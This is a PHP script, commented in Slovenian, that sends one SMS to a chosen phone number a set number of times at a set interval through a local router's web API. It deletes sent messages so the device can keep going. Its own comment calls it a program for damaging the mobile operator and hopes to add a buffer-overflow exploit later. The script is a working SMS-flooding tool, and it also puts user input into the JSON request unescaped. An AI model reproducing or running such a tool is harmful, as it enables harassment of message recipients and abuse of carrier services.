<?php
# poseben program za povzročanje škode operaterju, če imate neskončno SMS-jev. Uporabite kaki 2 sekundi čakanja, drugače se SMS ne bo poslal oziroma se bo queueal, kar lahko povzroči memory crash in buffer overflow. exploit za to bom, vsaj upam, naredil kmalu. kmalu.
# brez parametrov bo pokazal HTTP napako okoli 400 (napaka klienta) in navodila za uporabo.
include("header.php");
set_time_limit(0);
header("Content-type: text/plain");
@$stevilka = $_REQUEST['stevilka'];
@$tekst = $_REQUEST['tekst'];
@$koliko = $_REQUEST['koliko'];
@$cakanje = $_REQUEST['cakanje'];
$smsura = date("Y-m-d H:i:s");
if(!is_numeric($cakanje) || !is_numeric($stevilka) || !is_numeric($koliko) || strlen($tekst) > 40 || empty($tekst) || empty($stevilka) || empty($koliko)) {
	header("400 Bad request");
	echo "
 Napaka: Nastavljene morajo biti: številski spremenljivki stevilka (kam naj
 pošljem SMS) in koliko (kolikokrat naj pošljem SMS) in spremenljivka tekst
 (kaj naj pošljem), ki je večja od enega znaka in manjša od 40 znakov ter ne
 vsebuje posebnih znakov, samo črke in številke.
 
 Potrebujete tudi spremenljivko cakanje, ki v sekundah pove čas čakanja po
 pošiljanju vsakega SMS sporočila. Prosim, da popravite zahtevo
 in poskusite znova. Številka HTTP napake je okoli 400 (Bad request).
 
 ";
  exit("Program sms.php je mrtev.");
}

$opts = array('http' =>
    array(
        'method'  => 'POST',
        'header'  => 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8\r\n',
        'content' => '{"jsonrpc":"2.0","method":"SendSMS","params":{"SMSId":-1,"SMSContent":"'.$tekst.'","PhoneNumber":["'.$stevilka.'"],"SMSTime":"'.$smsura.'"},"id":"6.6"}' //uporabi $postdata za POST spremenljivke od zgoraj!
    )
);

$context  = stream_context_create($opts);


$deletemsgsopts = array('http' =>
    array(
        'method'  => 'POST',
        'header'  => 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8\r\n',
        'content' => '{"jsonrpc":"2.0","method":"DeleteSMS","params":{"DelFlag":0,"ContactId":"","SMSId":""},"id":"6.5"}' //uporabi $postdata za POST spremenljivke od zgoraj!
    )
);

$deletemsgscontext  = stream_context_create($deletemsgsopts);
$i = 0;
$result = "";
while($i < $koliko) {
	$i = $i + 1;
	$lastresult = file_get_contents('http://192.168.1.1/jrd/webapi?api=SendSMS', false, $context);
	$deletemsgs = file_get_contents('http://192.168.1.1/jrd/webapi?api=DeleteSMS', false, $deletemsgscontext); // da prepreči napolnjen storage
$result = $result . "
" . $lastresult;
	sleep($cakanje);
}
echo "
 Podatki uspešno poslani na SMS strežnik! Odgovor SMS strežnika je zapisan
 spodaj. Preverite podatke, če se zdijo pravilni. Podatki niso omejeni na
 standardnih 80 znakov na vrstico, tako da se lahko narišejo izven vašega
 terminala/ekrana. Pazite tudi na začetni overscan (presledek NI PRISOTEN).
 
 ";
echo "" . $result . "
"; 
if($lastresult == '{ "jsonrpc": "2.0", "result": { }, "id": "6.6" }') {
	echo"
 SMS strežnik je zagotovo uspešno prejel SMS in ga pošilja v SMS omrežje.

";
}
?>
